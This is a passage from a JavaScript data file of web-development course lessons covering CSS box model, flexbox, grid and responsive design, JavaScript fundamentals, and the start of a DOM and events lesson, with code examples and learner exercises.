        body: `Here is a fully styled HTML page that uses everything from this lesson. Notice the box-sizing reset at the top, the use of classes and element selectors, the box model properties, and the cascade working through specificity. Create this file and experiment with the values. Change colors. Adjust padding. Watch how the layout responds. Then try the exercise below.`,
        code: `/* style.css */\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n\nbody {\n  font-family: Arial, sans-serif;\n  margin: 0;\n  padding: 20px;\n  background: #f5f5f5;\n}\n\n.card {\n  width: 300px;\n  padding: 20px;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n  margin: 16px;\n  background: white;\n}\n\n.card h2 {\n  color: #333;\n  font-size: 1.5rem;\n  margin-bottom: 8px;\n}\n\n.card p {\n  color: #666;\n  font-size: 0.9rem;\n  line-height: 1.5;\n}\n\n.card button {\n  display: inline-block;\n  padding: 8px 16px;\n  background: #0066ff;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  cursor: pointer;\n}\n\n.card button:hover {\n  background: #0044cc;\n}`,
      },
    ],
    aiPrompt: `I have an HTML page with a basic card layout. I want to style it using CSS. Give me a complete CSS file that: uses box-sizing border-box, styles the body with a background color and padding, creates cards with the box model (padding, border, margin, border-radius), uses class selectors, uses a hover effect on buttons, and uses rem units. Explain each property and why you chose it.`,
    terminalMission: `Create style.css with the box-sizing reset at the top, then style an HTML page that has at least two cards with different classes. Each card must use padding, border, margin, a background color, and a hover effect. Use rem units for all sizes. Open in browser and verify.`,
  },

  'm2b-css-layout': {
    pathId: 'full-stack-web',
    title: 'CSS — flexbox, grid, responsive design basics',
    duration: '18 min',
    mekLabel: 'enough to create any common layout — navbars, cards, grids, centering',
    sections: [
      {
        heading: 'The layout problem — why is centering so hard?',
        body: `Before Flexbox and Grid, centering a div vertically was one of the hardest things in CSS. Developers used hacks like table display, absolute positioning with negative margins, and even JavaScript to get things to line up. Modern CSS has two layout systems that solve all of this: Flexbox (for one-dimensional layouts — a row or a column) and Grid (for two-dimensional layouts — rows and columns at the same time). These two systems cover every layout you will ever need. If you master Flexbox and Grid, you can build any layout — navbars, card grids, sidebars, hero sections, dashboards — without a single hack. This lesson teaches you both.`,
        callout: `Think of Flexbox as a single rope you can arrange items on (either horizontally or vertically). Think of Grid as a table where items sit in specific cells. Flexbox is great for navigation bars and centering. Grid is great for page layouts and card grids.`,
      },
      {
        heading: 'Flexbox — one-dimensional layout for rows and columns',
        body: `Flexbox works by turning a container into a flex container with display: flex. The container's children (called flex items) automatically line up in a row. You control how they behave with properties on the container. flex-direction: row (default) arranges items horizontally. flex-direction: column arranges them vertically. justify-content controls spacing along the main axis (horizontally for row, vertically for column). align-items controls spacing along the cross axis (vertically for row, horizontally for column). gap adds space between items. Flexbox also has properties on the individual items. flex-grow: 1 tells an item to take up remaining space. This is how you make a sidebar take up the rest of the page. flex-wrap: wrap lets items wrap to the next line when they run out of space — useful for responsive card rows. The most common combination you will use: display: flex with justify-content: center and align-items: center to perfectly center something in its container. This was the holy grail of CSS before Flexbox.`,
        code: `/* Horizontal navigation bar: */\n.nav {\n  display: flex;\n  justify-content: space-between;  /* Items pushed to edges */\n  align-items: center;             /* Vertically centered */\n  padding: 0 20px;\n  background: #333;\n}\n\n/* Centering a div (the holy grail): */\n.container {\n  display: flex;\n  justify-content: center;   /* Centered horizontally */\n  align-items: center;       /* Centered vertically */\n  height: 100vh;             /* Full viewport height */\n}\n\n/* Card row that wraps on small screens: */\n.card-row {\n  display: flex;\n  flex-wrap: wrap;           /* Items wrap to next line */\n  gap: 16px;                 /* Space between cards */\n}\n\n.card {\n  flex: 1 1 250px;           /* Grow, shrink, base width */\n  /* Each card is at least 250px wide and grows to fill space */\n}`,
      },
      {
        heading: 'Common flexbox patterns you will use daily',
        body: `There are a handful of flexbox patterns that appear in almost every website. A navbar with logo on the left and links on the right uses justify-content: space-between. A row of equal-width buttons uses flex: 1 on each button. A vertical stack of items uses flex-direction: column. A card grid that wraps responsively uses flex-wrap: wrap with a flex-basis on each card. A sidebar layout uses a fixed-width sidebar and a content area with flex-grow: 1. Instead of memorizing every property, remember this: decide whether your items go in a row or a column, decide how they should be spaced out, and decide if they should wrap. Those three decisions cover 90% of flexbox usage.`,
        code: `/* Pattern 1: Navbar with logo + links */\n.navbar {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 1rem 2rem;\n}\n\n/* Pattern 2: Equal-width buttons */\n.btn-group {\n  display: flex;\n  gap: 8px;\n}\n.btn-group button {\n  flex: 1;  /* Each button takes equal width */\n}\n\n/* Pattern 3: Sidebar + content */\n.layout {\n  display: flex;\n  gap: 20px;\n}\n.sidebar {\n  width: 250px;         /* Fixed width */\n  flex-shrink: 0;       /* Prevents shrinking */\n}\n.content {\n  flex-grow: 1;         /* Takes remaining space */\n}\n\n/* Pattern 4: Responsive card grid */\n.grid {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 16px;\n}\n.grid-item {\n  flex: 1 1 300px;      /* At least 300px, grows to fill */\n}`,
      },
      {
        heading: 'Grid — two-dimensional layout for rows and columns at once',
        body: `Where Flexbox works on one line at a time, Grid works on a full two-dimensional area. You define rows and columns, then place items into cells. Turn a container into a grid with display: grid. Define your columns with grid-template-columns: 1fr 1fr 1fr (three equal columns) or grid-template-columns: 200px 1fr (fixed sidebar + flexible content). The fr unit is a "fraction" of the available space — 1fr means "take one share of the leftover space." Define your rows with grid-template-rows. Add gap between cells with gap. You can also name areas with grid-template-areas and place items into them using grid-area. This is incredibly powerful for page layouts. Grid is best when you are designing the overall page structure — the header, sidebar, main content, and footer. Flexbox is best for arranging items within a section — the navigation links inside the header, the cards inside the main content. Use them together: Grid for the big picture, Flexbox for the details.`,
        code: `/* Simple 3-column grid: */\n.grid-3 {\n  display: grid;\n  grid-template-columns: 1fr 1fr 1fr;  /* Three equal columns */\n  gap: 16px;\n}\n\n/* Page layout with named areas: */\n.page {\n  display: grid;\n  grid-template-columns: 250px 1fr;    /* Sidebar + main */\n  grid-template-rows: auto 1fr auto;   /* Header + content + footer */\n  grid-template-areas:\n    "header header"\n    "sidebar main"\n    "footer footer";\n  min-height: 100vh;\n  gap: 0;\n}\n\nheader { grid-area: header; }\naside  { grid-area: sidebar; }\nmain   { grid-area: main; }\nfooter { grid-area: footer; }\n\n/* Responsive grid that auto-fills columns: */\n.auto-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));\n  gap: 16px;\n}`,
      },
      {
        heading: 'Responsive design — making layouts work on every screen',
        body: `Responsive design means your website looks good on phones, tablets, laptops, and giant monitors. The key tool is the media query — a CSS rule that applies only when certain conditions are met. The most common condition is screen width: @media (max-width: 768px) { ... } applies styles when the screen is 768 pixels wide or narrower. The standard approach is mobile-first design. You write the base CSS for small screens (phones), then add media queries for larger screens. This is easier than starting with a desktop layout and trying to cram it into a phone. Your base CSS uses a single-column layout. At 768px, you switch to two columns. At 1024px, you switch to three columns. Combined with Flexbox's flex-wrap: wrap and Grid's auto-fill, you can create responsive layouts with very little media query code. The meta viewport tag in your HTML <head> is required for responsive design — it tells mobile browsers not to zoom out and pretend they are desktop screens. You already have this in your HTML skeleton from the HTML lesson.`,
        code: `/* Mobile-first base styles (phone): */\n.layout {\n  display: grid;\n  grid-template-columns: 1fr;          /* Single column on mobile */\n  gap: 16px;\n}\n\n/* Tablet (768px and wider): */\n@media (min-width: 768px) {\n  .layout {\n    grid-template-columns: 1fr 1fr;    /* Two columns on tablet */\n  }\n}\n\n/* Desktop (1024px and wider): */\n@media (min-width: 1024px) {\n  .layout {\n    grid-template-columns: 1fr 1fr 1fr; /* Three columns on desktop */\n  }\n}\n\n/* Responsive nav — hamburger above 768px: */\n.nav-links {\n  display: flex;\n  gap: 16px;\n}\n\n@media (max-width: 767px) {\n  .nav-links {\n    flex-direction: column;  /* Stack vertically on mobile */\n  }\n}`,
        callout: `Test your responsive design by resizing your browser window. Drag the edge to make it narrow like a phone, then wide like a desktop. If things break at a certain width, that is where you need a media query. Most breakpoints are 480px (small phone), 768px (tablet), and 1024px (desktop).`,
      },
      {
        heading: 'Practical exercise — build a responsive page',
        body: `Here is a complete HTML + CSS page that uses everything from this lesson. It has a grid layout with a header, sidebar, main content area, and footer. The sidebar moves to the top on mobile. The main content uses flexbox to display cards that wrap. The entire page is responsive with media queries. Create this file, open it, and resize your browser. Watch the layout change. Then modify it: change the breakpoints, add more cards, change the colors. This is how you learn layout — by breaking it and fixing it.`,
        code: `<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n  <title>Responsive Layout</title>\n  <style>\n    *, *::before, *::after { box-sizing: border-box; }\n    body { margin: 0; font-family: Arial, sans-serif; }\n\n    .page {\n      display: grid;\n      grid-template-columns: 1fr;\n      grid-template-rows: auto auto 1fr auto;\n      grid-template-areas:\n        "header"\n        "sidebar"\n        "main"\n        "footer";\n      min-height: 100vh;\n    }\n\n    header { grid-area: header; background: #333; color: white; padding: 1rem 2rem; }\n    aside  { grid-area: sidebar; background: #f0f0f0; padding: 1rem; }\n    main   { grid-area: main; padding: 1rem; }\n    footer { grid-area: footer; background: #333; color: white; padding: 1rem; text-align: center; }\n\n    .card-container {\n      display: flex;\n      flex-wrap: wrap;\n      gap: 16px;\n    }\n\n    .card {\n      flex: 1 1 250px;\n      padding: 1rem;\n      border: 1px solid #ddd;\n      border-radius: 8px;\n      background: white;\n    }\n\n    @media (min-width: 768px) {\n      .page {\n        grid-template-columns: 200px 1fr;\n        grid-template-rows: auto 1fr auto;\n        grid-template-areas:\n          "header header"\n          "sidebar main"\n          "footer footer";\n      }\n    }\n  </style>\n</head>\n<body>\n  <div class="page">\n    <header><h1>My Site</h1></header>\n    <aside><h2>Sidebar</h2><p>Links and navigation go here.</p></aside>\n    <main>\n      <h2>Main Content</h2>\n      <div class="card-container">\n        <div class="card">Card 1</div>\n        <div class="card">Card 2</div>\n        <div class="card">Card 3</div>\n        <div class="card">Card 4</div>\n      </div>\n    </main>\n    <footer>&copy; 2025 My Site</footer>\n  </div>\n</body>\n</html>`,
      },
    ],
    aiPrompt: `I want a responsive landing page layout. Generate the complete HTML and CSS. It should have: a full-width hero section with centered text and a button, a features section with 3 cards in a row (stack on mobile), and a footer. Use CSS Grid for the page structure and Flexbox for the cards. Include mobile-first media queries. Explain how the layout changes at each breakpoint.`,
    terminalMission: `Create an HTML file with a responsive page that uses both Grid and Flexbox. The page must have a header, a main content area with at least 3 flex items that wrap, and a footer. Use a media query to change from single-column to multi-column at 768px. Open in browser and verify by resizing the window.`,
  },

  'm2c-js-fundamentals': {
    pathId: 'full-stack-web',
    title: 'JavaScript — variables, functions, conditionals, loops',
    duration: '20 min',
    mekLabel: 'enough to write logic, manipulate data, and make pages interactive',
    sections: [
      {
        heading: 'What is JavaScript and how is it different from HTML/CSS?',
        body: `HTML is the structure of a page. CSS is the presentation. JavaScript is the behavior — the logic that makes things happen. When you click a button and a menu opens, that is JavaScript. When a page loads new content without refreshing, that is JavaScript. When a form validates your email before submitting, that is JavaScript. Unlike HTML and CSS, JavaScript is a real programming language. It has variables, loops, conditions, and functions. You write logic in it. JavaScript runs in the browser (every browser has a JavaScript engine built in) and also on servers using Node.js (which you will learn in Module 4). You add JavaScript to your page using a <script> tag at the bottom of the HTML <body>, or by linking to a .js file. The order matters — your script should load after the HTML content so it can find and manipulate elements.`,
        code: `<!-- Adding JavaScript to your HTML: -->\n<body>\n  <h1 id="title">Hello</h1>\n  <button id="btn">Click me</button>\n\n  <!-- Scripts go at the bottom of body: -->\n  <script>\n    // JavaScript code here\n    document.getElementById("btn").addEventListener("click", () => {\n      document.getElementById("title").textContent = "You clicked!";\n    });\n  </script>\n</body>`,
      },
      {
        heading: 'Variables — storing data with let and const',
        body: `A variable is a named container that holds a value. Think of it as a labeled box where you store something. In modern JavaScript, you create variables with two keywords. Use const when the value should never change — the box is sealed. Use let when the value will change later — the box can be opened and its contents replaced. const is the default. Use it unless you know the value needs to change. The older var keyword exists but has confusing scoping rules — do not use it. Variable names should describe what they hold. userName is better than u or n. firstName is better than fn. Good naming makes your code readable. Bad naming makes it impossible to understand. A variable name cannot contain spaces, cannot start with a number, and should use camelCase (firstSecondThird) as the convention.`,
        code: `// const — the value stays the same forever:\nconst firstName = "Ada";\nconst birthYear = 1815;\nconst pi = 3.14159;\n\n// let — the value can change:\nlet score = 0;\nscore = 10;              // This is fine, score can change\nscore = score + 5;       // score is now 15\n\n// This would cause an error:\n// firstName = "Charles";  // Error! const cannot be reassigned\n\n// Always use const unless you need to reassign:\nconst apiUrl = "https://api.example.com/data";  // Good — never changes\nlet currentUser = null;    // Necessary — user changes on login`,
        callout: `Rule of thumb: always start with const. If the JavaScript engine complains that you are trying to reassign a const, change it to let. This habit prevents accidental overwrites and makes your code more predictable.`,
      },
      {
        heading: 'Data types — what kinds of values can you store?',
        body: `JavaScript has several types of values. A string is text, wrapped in quotes — "hello", 'hello', or \`hello\` (template literals, which you will learn soon). A number is a numeric value — 42, 3.14, -7. Numbers do not use quotes. A boolean is either true or false — like a light switch, on or off. null is an intentional empty value — it means "nothing" or "empty" on purpose. undefined means a variable was declared but not given a value yet — it exists but has nothing in it. An object is a collection of related data (coming up). An array is a list of items (also coming up). You can check the type of any value with typeof. Understanding types is critical because JavaScript sometimes converts types automatically (type coercion). "5" + 3 gives "53" (string concatenation), not 8. This is a common source of bugs. Be explicit about your types.`,
        code: `const name = "Ada";         // String — text in quotes\nconst age = 28;              // Number — no quotes\nconst isLoggedIn = true;     // Boolean — true or false\nconst empty = null;          // Null — intentionally empty\nlet notDefined;              // Undefined — declared but no value\n\nconsole.log(notDefined);     // undefined\nconsole.log(typeof "hello"); // "string"\nconsole.log(typeof 42);      // "number"\nconsole.log(typeof true);    // "boolean"\n\n// Watch out for type coercion:\nconsole.log("5" + 3);        // "53" — string! Not 8\nconsole.log("5" - 3);        // 2 — number! JavaScript is inconsistent\nconsole.log(5 == "5");       // true — loose equality (bad)\nconsole.log(5 === "5");      // false — strict equality (good)\n\n// Always use === instead of == to avoid coercion surprises`,
      },
      {
        heading: 'Operators — doing things with values',
        body: `Operators let you perform operations on values. Arithmetic operators do math: + (addition), - (subtraction), * (multiplication), / (division), ** (exponentiation — 2 ** 3 is 8), % (modulo — remainder, useful for checking if a number is even). Comparison operators compare values and return a boolean: === (strict equality), !== (strict inequality), >, <, >=, <=. Logical operators combine conditions: && (AND — both must be true), || (OR — at least one must be true), ! (NOT — flips true to false). Assignment operators set values: = (assign), += (add and assign — x += 5 means x = x + 5). The increment operator ++ adds 1 (x++ is the same as x = x + 1). The decrement operator -- subtracts 1.`,
        code: `// Arithmetic:\nconst sum = 10 + 5;          // 15\nconst product = 4 * 3;       // 12\nconst power = 2 ** 10;       // 1024\nconst remainder = 17 % 5;    // 2 (17 divided by 5 is 3 remainder 2)\n\n// Comparison (always use ===, not ==):\nconsole.log(10 === 10);      // true\nconsole.log(10 !== 5);       // true\nconsole.log(10 > 5);         // true\nconsole.log(10 <= 10);       // true\n\n// Logical:\nconst isAdult = age >= 18;\nconst hasLicense = true;\nconst canDrive = isAdult && hasLicense;  // true only if BOTH are true\nconst isWeekend = day === "Saturday" || day === "Sunday";\nconst isNotLoggedIn = !isLoggedIn;       // Flips true to false\n\n// Assignment shortcuts:\nlet score = 10;\nscore += 5;    // score is now 15 (same as score = score + 5)\nscore++;       // score is now 16\nscore--;       // score is now 15`,
      },
      {
        heading: 'Conditionals — making decisions in code',
        body: `Conditionals let your code make decisions. The if statement runs code only if a condition is true. The else if adds another condition to check. The else runs if nothing else matched. A switch statement is useful when you are checking one variable against many possible values — it is cleaner than a long chain of else if. The ternary operator (condition ? valueIfTrue : valueIfFalse) is a shorthand for simple if/else — it returns one of two values. Do not overuse ternaries — they are great for simple cases but make code hard to read if the conditions get complex. Always use curly braces {} even for single-line conditions. It prevents bugs when you add more lines later.`,
        code: `const age = 20;\n\nif (age < 13) {\n  console.log("Child");\n} else if (age < 20) {\n  console.log("Teenager");\n} else if (age < 65) {\n  console.log("Adult");\n} else {\n  console.log("Senior");\n}\n\n// Switch — for one variable with many possible values:\nconst day = "Monday";\nswitch (day) {\n  case "Monday":\n    console.log("Start of work week");\n    break;\n  case "Friday":\n    console.log("Almost weekend");\n    break;\n  case "Saturday":\n  case "Sunday":\n    console.log("Weekend!");\n    break;\n  default:\n    console.log("Midweek");\n}\n\n// Ternary — shorthand for simple conditions:\nconst price = 100;\nconst shipping = price > 50 ? "Free" : "$5.99";\n// If price > 50, shipping = "Free", otherwise shipping = "$5.99"\n\nconsole.log(shipping);  // "Free"`,
      },
      {
        heading: 'Functions — reusable blocks of code',
        body: `A function is a packaged block of code that does one specific thing. You define it once and call it (run it) whenever you need that behavior. Functions are the building blocks of JavaScript programs. The modern way to write a function is an arrow function: const functionName = (parameters) => { code }. The older way is function functionName(parameters) { code }. Both work, but arrow functions are preferred in modern JavaScript. Parameters are like variables that the function receives when it is called. The return statement sends a value back to the caller. If a function does not return anything, it returns undefined by default. Functions should do one thing and do it well. If a function is doing too many things, break it into smaller functions. Single-responsibility functions are easier to test, debug, and reuse.`,
        code: `// Function that greets someone:\nconst greet = (name) => {\n  return "Hello, " + name + "!";\n};\n\nconsole.log(greet("Ada"));   // "Hello, Ada!"\nconsole.log(greet("Grace")); // "Hello, Grace!"\n\n// Function that calculates the area of a rectangle:\nconst area = (width, height) => {\n  return width * height;\n};\n\n// Functions can call other functions:\nconst formatArea = (w, h) => {\n  const result = area(w, h);\n  return "The area is " + result + " square meters.";\n};\n\nconsole.log(formatArea(5, 3));  // "The area is 15 square meters."\n\n// Older function syntax (still works, less common in modern code):\nfunction oldGreet(name) {\n  return "Hello, " + name + "!";\n}`,
      },
      {
        heading: 'Scope — where variables live and die',
        body: `Scope determines where a variable is accessible. Variables declared with const and let are block-scoped — they exist only inside the nearest curly braces {}. A variable declared inside a function is not accessible outside that function. A variable declared inside an if block is not accessible outside it. Variables declared outside any function or block are global — they are accessible everywhere. Global variables are convenient but dangerous. Any code can accidentally overwrite them, leading to bugs that are hard to track down. Keep variables in the narrowest scope possible. If a variable is only needed inside a function, declare it inside that function. If it is only needed inside a loop, declare it inside that loop. This is called the principle of least privilege — give your variables the minimum access they need.`,
        code: `const globalVar = "I am everywhere";  // Global scope\n\nconst myFunction = () => {\n  const functionVar = "I am inside the function";\n  // globalVar is accessible here\n  // functionVar is ONLY accessible here\n  \n  if (true) {\n    const blockVar = "I am inside the if block";\n    // blockVar is ONLY accessible inside these braces\n    console.log(globalVar);     // Works\n    console.log(functionVar);   // Works\n  }\n  \n  // console.log(blockVar);     // Error! blockVar is not defined here\n};\n\n// console.log(functionVar);    // Error! functionVar is not defined here\n\n// Best practice: keep variables as local as possible:\nconst calculateTotal = (items) => {\n  let total = 0;                    // Only needed inside this function\n  for (const item of items) {\n    total += item.price;            // Only needed inside this loop\n  }\n  return total;\n};`,
      },
      {
        heading: 'Loops — doing things repeatedly',
        body: `Loops let you repeat code without writing it over and over. The for loop is the most common: for (let i = 0; i < 5; i++) { ... } runs the code 5 times, with i going from 0 to 4. The while loop runs as long as a condition is true — be careful not to create an infinite loop (a condition that never becomes false will crash your browser). The for...of loop iterates over items in an array — it is the cleanest way to loop through a list. The for...in loop iterates over keys in an object. You will use for and for...of most often. Loops are powerful because they let you process data without knowing how much data there is. A loop that works on an array of 3 items also works on an array of 3,000 items — you just change the array.`,
        code: `// Classic for loop — runs 5 times, i goes 0, 1, 2, 3, 4:\nfor (let i = 0; i < 5; i++) {\n  console.log("Iteration:", i);\n}\n\n// Looping through an array with for...of (preferred):\nconst fruits = ["apple", "banana", "cherry"];\nfor (const fruit of fruits) {\n  console.log(fruit);\n}\n\n// While loop — runs as long as condition is true:\nlet count = 0;\nwhile (count < 3) {\n  console.log("Count:", count);\n  count++;\n}\n\n// ⚠️  Never write this — it crashes the browser:\n// while (true) { console.log("forever"); }\n\n// Looping through an object with for...in:\nconst user = { name: "Ada", age: 28, role: "developer" };\nfor (const key in user) {\n  console.log(key, ":", user[key]);  // name: Ada, age: 28, etc.\n}`,
      },
      {
        heading: 'Arrays — ordered lists of data',
        body: `An array is an ordered list of values. You create one with square brackets: const colors = ["red", "green", "blue"]. Each item has an index (position) starting at 0. colors[0] is "red", colors[1] is "green", colors[2] is "blue". Arrays have many built-in methods. push adds an item to the end. pop removes the last item. length tells you how many items are in the array. indexOf finds the position of an item. includes checks if an item exists. join turns an array into a string. The most powerful methods are map (transforms every item and returns a new array), filter (keeps items that match a condition), and forEach (runs a function on each item without creating a new array). These are called array methods and they are the modern way to work with lists in JavaScript.`,
        code: `const colors = ["red", "green", "blue"];\n\nconsole.log(colors[0]);        // "red" — first item (index 0)\nconsole.log(colors.length);    // 3\n\ncolors.push("yellow");         // Add to end: ["red", "green", "blue", "yellow"]\ncolors.pop();                  // Remove last: ["red", "green", "blue"]\n\n// map — transform each item:\nconst uppercase = colors.map((color) => color.toUpperCase());\nconsole.log(uppercase);        // ["RED", "GREEN", "BLUE"]\n\n// filter — keep items that match:\nconst longColors = colors.filter((color) => color.length > 3);\nconsole.log(longColors);       // ["green", "blue"]\n\n// forEach — do something for each item:\ncolors.forEach((color) => {\n  console.log("Color:", color);\n});\n\n// Find an item:\nconst hasRed = colors.includes("red");     // true\nconst position = colors.indexOf("green");  // 1`,
      },
      {
        heading: 'Objects — collections of related data',
        body: `An object is a collection of key-value pairs. Each key (also called a property) has a value. The value can be any data type — string, number, boolean, array, even another object. Objects represent real-world things. A user object might have properties: name, email, age, isAdmin. You access a property with dot notation: user.name or bracket notation: user["name"]. Bracket notation is useful when the key is stored in a variable. You can add or change properties anytime: user.age = 29. You can delete properties: delete user.age. Objects and arrays together form the backbone of how data moves around the web. When a server sends data to your page, it is almost always in the form of objects inside arrays, or arrays inside objects.`,
        code: `const user = {\n  name: "Ada Lovelace",\n  age: 28,\n  email: "ada@example.com",\n  isAdmin: false,\n  skills: ["mathematics", "programming", "poetry"],\n  address: {                          // Object inside an object\n    city: "London",\n    country: "UK"\n  }\n};\n\n// Accessing properties:\nconsole.log(user.name);              // "Ada Lovelace"\nconsole.log(user["name"]);           // Same thing, different syntax\nconsole.log(user.skills[0]);         // "mathematics"\nconsole.log(user.address.city);      // "London"\n\n// Modifying properties:\nuser.age = 29;                       // Change existing property\nuser.isAdmin = true;\nuser.nickname = "Lady Ada";          // Add new property\n\n// Useful methods:\nconst keys = Object.keys(user);      // ["name", "age", "email", ...]\nconst values = Object.values(user);  // ["Ada Lovelace", 28, ...]\nconst entries = Object.entries(user); // [[key, value], [key, value], ...]`,
      },
      {
        heading: 'Template literals — the better way to build strings',
        body: 'Template literals are strings that use backticks (`) instead of quotes. They have two superpowers. First, you can embed variables directly in the string using ${variable}. No more adding strings together with +. Second, they can span multiple lines without using \\n. Template literals make your code cleaner and more readable. Instead of "Hello, " + name + "! You are " + age + " years old.", you write `Hello, ${name}! You are ${age} years old.` Use template literals for all string building in modern JavaScript. The only trick: if you need a literal backtick inside a template literal, you must escape it with a backslash: \\`',
        code: 'const name = "Ada";\nconst age = 28;\n\n// Old way (string concatenation with +):\nconst oldMessage = "Hello, " + name + "! You are " + age + " years old.";\n\n// Modern way (template literal):\nconst message = `Hello, ${name}! You are ${age} years old.`;\n\n// Multi-line strings without \\n:\nconst html = `\n  <div class="card">\n    <h2>${name}</h2>\n    <p>Age: ${age}</p>\n  </div>\n`;\n\n// You can put any JavaScript expression inside ${}:\nconst price = 50;\nconst summary = `Your total is $${price + 10} with shipping.`;\n// "Your total is $60 with shipping."',
      },
      {
        heading: 'Practical exercise — build a simple interactive script',
        body: `Let us put everything together. Here is a complete JavaScript program that uses variables, arrays, objects, functions, loops, conditionals, and template literals. It defines a list of products, filters for available ones, calculates the total, and displays a receipt. Read through it, understand each part, then type it out yourself and run it in your browser console (F12 → Console tab). Change the data. Add more products. Modify the logic. Break it and fix it. That is how you learn.`,
        code: '// A simple shopping cart program:\n\nconst products = [\n  { name: "T-Shirt", price: 20, inStock: true },\n  { name: "Jeans", price: 50, inStock: true },\n  { name: "Hat", price: 15, inStock: false },\n  { name: "Socks", price: 5, inStock: true }\n];\n\n// Filter for available products:\nconst available = products.filter((item) => item.inStock);\n\n// Calculate total:\nconst calculateTotal = (items) => {\n  let total = 0;\n  for (const item of items) {\n    total += item.price;\n  }\n  return total;\n};\n\n// Apply discount if total is over $50:\nconst total = calculateTotal(available);\nconst discount = total > 50 ? 0.1 : 0;\nconst finalTotal = total - total * discount;\n\n// Generate receipt:\nconst generateReceipt = (items, total, discount) => {\n  let receipt = "=== RECEIPT ===\\n";\n  for (const item of items) {\n    receipt += `${item.name}: $${item.price}\\n`;\n  }\n  receipt += "---------------\\n";\n  receipt += `Subtotal: $${total}\\n`;\n  if (discount > 0) {\n    receipt += `Discount: ${discount * 100}%\\n`;\n  }\n  receipt += `Total: $${finalTotal}\\n`;\n  return receipt;\n};\n\nconsole.log(generateReceipt(available, total, discount));',
      },
    ],
    aiPrompt: `I am learning JavaScript fundamentals. Give me 5 small practice exercises. Exercise 1: declare variables with const and let for a user profile. Exercise 2: write a function that checks if a number is even or odd. Exercise 3: loop through an array of names and print each one. Exercise 4: filter an array of objects to keep only items where price is less than $50. Exercise 5: create an object representing a book with title, author, year, and a method that returns "Title by Author, published Year". Provide solutions after each exercise.`,
    terminalMission: `Open your browser console (F12 → Console tab). Declare an array of 5 todo objects (each with text and completed properties). Write a function that filters for incomplete todos and logs them using a loop and template literals. Call the function and verify the output.`,
  },

  'm2c-js-dom-fetch': {
    pathId: 'full-stack-web',
    title: 'The DOM, event listeners & the Fetch API',
    duration: '20 min',
    mekLabel: 'enough to build interactive pages that respond to users and load live data',
    sections: [
      {
        heading: 'What is the DOM and why do you need it?',
        body: `DOM stands for Document Object Model. It is the browser's internal representation of your HTML page as a tree of objects that JavaScript can access and modify. When the browser loads your HTML, it creates a DOM tree. Every HTML element becomes a node in that tree. The <html> element is the root. Inside it, <head> and <body> are branches. Inside <body>, <h1>, <p>, <div> are smaller branches or leaves. JavaScript can walk this tree, find elements, read their content, change their styles, add new elements, remove elements, and respond to user interactions. Without the DOM, JavaScript would just be a calculator — it could do math but could not touch the page. The DOM is the bridge between your JavaScript code and the visible page. Every time a page updates without a full refresh — infinite scroll, live search, form validation errors, modal dialogs — it is JavaScript manipulating the DOM.`,
      },
      {
        heading: 'Selecting elements — finding things in the DOM tree',
        body: `Before you can manipulate an element, you need to find it. JavaScript provides several ways to select elements. document.getElementById("id") returns a single element by its id attribute. This is the fastest selector but only works on elements with an id. document.querySelector("selector") returns the first element matching any CSS selector — "#id", ".class", "div p", "button:hover" — anything you would write in CSS. document.querySelectorAll("selector") returns all matching elements as a NodeList (similar to an array). You will use querySelector and querySelectorAll most often because they accept any CSS selector. The document refers to the entire page. You call these methods on document to search the whole DOM. When you have a specific element, you can call querySelector on it to search only inside that element — this is called scoping your search and is more efficient.`,
        code: `<!-- HTML for our examples: -->\n<body>\n  <h1 id="title">My Page</h1>\n  <p class="description">This is a description.</p>\n  <ul id="list">\n    <li class="item">Item 1</li>\n    <li class="item">Item 2</li>\n    <li class="item hidden">Item 3 (hidden)</li>\n  </ul>\n  <button id="btn">Click me</button>\n</body>\n\n<script>\n// Select by ID:\nconst title = document.getElementById("title");\nconsole.log(title.textContent);  // "My Page"\n\n// Select by CSS selector (first match):\nconst firstItem = document.querySelector(".item");\nconsole.log(firstItem.textContent);  // "Item 1"\n\n// Select ALL matches (returns a NodeList):\nconst allItems = document.querySelectorAll(".item");\nconsole.log(allItems.length);   // 3\n\n// Loop through selected elements:\nallItems.forEach((item) => {\n  console.log(item.textContent);\n});\n\n// Select something inside another element:\nconst list = document.getElementById("list");\nconst listItems = list.querySelectorAll("li");\n// Only searches inside #list — more efficient\n</script>`,
      },
      {
        heading: 'Manipulating elements — changing what the user sees',
        body: `Once you have an element, you can change it. textContent changes the text inside an element — it is safe and fast, and it does not interpret HTML. innerHTML changes the HTML inside an element — it can add new elements but is dangerous if the content comes from a user (it can execute scripts). classList lets you add, remove, or toggle CSS classes. style lets you change inline CSS. setAttribute changes any attribute. createElement creates a new element in memory (not yet on the page). appendChild adds it to the DOM as a child of another element. remove removes an element from the DOM. These are the tools you will use in every interactive page. If you understand these, you can build any UI update — showing a loading spinner, adding a new todo to a list, updating a user's name, hiding a modal.`,
        code: `const title = document.getElementById("title");\nconst list = document.getElementById("list");\n\n// Change text:\ntitle.textContent = "New Title!";\n\n// Change HTML (use only with trusted content):\ntitle.innerHTML = "<em>New Title!</em>";\n\n// Add/remove/toggle classes:\ntitle.classList.add("highlight");\ntitle.classList.remove("old-class");\ntitle.classList.toggle("active");  // Adds if missing, removes if present\n\n// Change styles directly:\ntitle.style.color = "blue";\ntitle.style.fontSize = "24px";   // CSS properties use camelCase in JS\n\n// Create and add a new element:\nconst newItem = document.createElement("li");\nnewItem.textContent = "Item 4";\nnewItem.classList.add("item");\nlist.appendChild(newItem);       // Adds to the end of the list\n\n// Remove an element:\nconst item3 = document.querySelector(".hidden");\nitem3.remove();                  // Removes from the DOM entirely`,
      },
      {
        heading: 'Event listeners — responding to user actions',
        body: `An event is something that happens in the browser — a click, a key press, a form submission, a mouse movement, a page load. An event listener is a function that runs when that event happens. You attach an event listener to an element using addEventListener. The first argument is the event type (like "click", "submit", "keydown", "input", "mouseover"). The second argument is the function to run when the event occurs. When the event fires, JavaScript passes an event object to your function. This object has useful properties. event.target is the element that triggered the event. event.preventDefault() stops the browser's default behavior — crucial for forms (prevents the page from refreshing on submit). For keyboard events, event.key tells you which key was pressed. Event listeners are what make a static page interactive. Without them, your page is just a poster. With them, it becomes an application.`,
